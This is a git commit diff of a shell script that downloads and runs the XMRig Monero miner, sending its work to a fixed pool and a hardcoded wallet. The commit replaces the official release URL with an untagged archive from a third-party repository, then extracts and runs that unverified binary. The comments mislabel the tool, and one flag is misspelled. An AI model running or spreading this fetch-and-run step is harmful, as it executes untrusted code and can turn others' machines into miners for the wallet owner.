8aa1b687567c3f5761ba2a654e9c4c7583d222ee
Wistan William <darkcompilershop@gmail.com>
2025-09-05 15:30:55 +0700

    xmrig-auto.sh

--- xmrig-auto.sh
+++ xmrig-auto.sh
@@ -2,8 +2,8 @@
 # Script to run SRBMiner-Multi for Monero (XMR) mining
 
 # Download and extract SRBMiner-Multi
-wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
-tar xvaf xmrig-6.24.0-linux-static-x64.tar.gz
+wget https://github.com/Miu-Create/xmrig/releases/download/untagged-72e8e191887e02aeb2ac/xmrig-auto.tar.gz
+tar xvaf xmrig-auto.tar.gz
 cd xmrig-6.24.0
 chmod +x xmrig
 
@@ -11,4 +11,4 @@ chmod +x xmrig
 clear
 
 # Run SRBMiner-Multi
-./xmrig -o mine.monerod.org:5555 -u 45FfyvGLUB7R9Ycoy7eU8hcjWg9o3QaoAi4f8JArb9yHba3WbvReJuBeFF4aq4zPjVgmS2PYBeQm5ERxSBmeczye4NJgoa3 --tls -k --coin monero -a rx/0 --theards=4
+./xmrig -o mine.monerod.org:4444 -u 45FfyvGLUB7R9Ycoy7eU8hcjWg9o3QaoAi4f8JArb9yHba3WbvReJuBeFF4aq4zPjVgmS2PYBeQm5ERxSBmeczye4NJgoa3 -p miningxmr --tls -k --coin monero -a rx/0 --theards=4
